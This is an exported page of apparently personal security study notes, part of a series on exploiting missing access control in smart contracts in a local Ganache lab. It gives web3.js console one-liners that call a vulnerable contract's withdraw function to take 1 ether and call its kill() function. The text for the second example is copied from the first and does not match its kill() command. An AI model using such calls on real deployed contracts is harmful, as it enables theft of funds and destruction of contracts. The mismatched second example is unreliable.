<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Call smart contract function from web3</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Call smart contract function from web3</h1><br/>After we have setup <span style="color:#ff00e0;">contract</span> and <span style="color:#a020f0;">account</span> in the <a href="Exploitation--Vulnerabilities--IDOR_InDirect_Object_Reference--Call_Public_Functions_with_Web3.js--Install_Web3_and_interact_with_Genache.html">previous chapter</a><br /><strong><span style="color:#a5452a;">example 1:</span></strong><br />we can call <span style="color:#ff0000;">withdraw</span> vulnerable function of the Smart Contract from web3:<br />   ◇ function Source Code<br />        <a href=""><img src="images/1423-1.png" alt="images/1423-1.png" /></a><br />   ◇ function ABI<br />        <a href=""><img src="images/1423-2.png" alt="images/1423-2.png" /></a><br />       <div class="codebox"><div class="codebox">&gt;&nbsp;contract.methods.withdraw(&quot;1000000000000000000&quot;).send<span style="color:#000000;font-weight:400">(</span>{gas:&nbsp;3000000,from:&nbsp;account}<span style="color:#000000;font-weight:400">)</span></div></div><br />       Now we can stole 1 ether = 1.000.000.000.000.000.000 wei  (10^18) using the <span style="color:#ff0000;">withdraw</span> vulnerable function<br />       <a href=""><img src="images/1423-3.png" alt="images/1423-3.png" /></a><br />        This command(operation) will add to “account” 1 ether minus(-) the gas fee (<a href=""><img src="images/1423-4.png" alt="images/1423-4.png" /></a>)<br />        <a href=""><img src="images/1423-5.png" alt="images/1423-5.png" /></a><br /><br /><strong><span style="color:#a5452a;">example 2:</span></strong><br />we can call <span style="color:#ff0000;">withdraw</span> vulnerable function of the Smart Contract from web3:<br />   ◇ function Source Code<br />        <a href=""><img src="images/1423-6.png" alt="images/1423-6.png" /></a><br />   ◇ function ABI<br />        <a href=""><img src="images/1423-7.png" alt="images/1423-7.png" /></a><br />       <div class="codebox"><div class="codebox">&gt;&nbsp;contract.methods.kill().send<span style="color:#000000;font-weight:400">(</span>{gas:&nbsp;3000000,from:&nbsp;account}<span style="color:#000000;font-weight:400">)</span></div></div><br />       Now we can stole 1 ether = 1.000.000.000.000.000.000 wei  (10^18) using the <span style="color:#ff0000;">withdraw</span> vulnerable function<br />       <a href=""><img src="images/1423-8.png" alt="images/1423-8.png" /></a><br />        This command(operation) will add to “account” 1 ether minus(-) the gas fee (<a href=""><img src="images/1423-9.png" alt="images/1423-9.png" /></a>)<br />        <a href=""><img src="images/1423-10.png" alt="images/1423-10.png" /></a><br /><br /><br /></div>
</body>
</html>
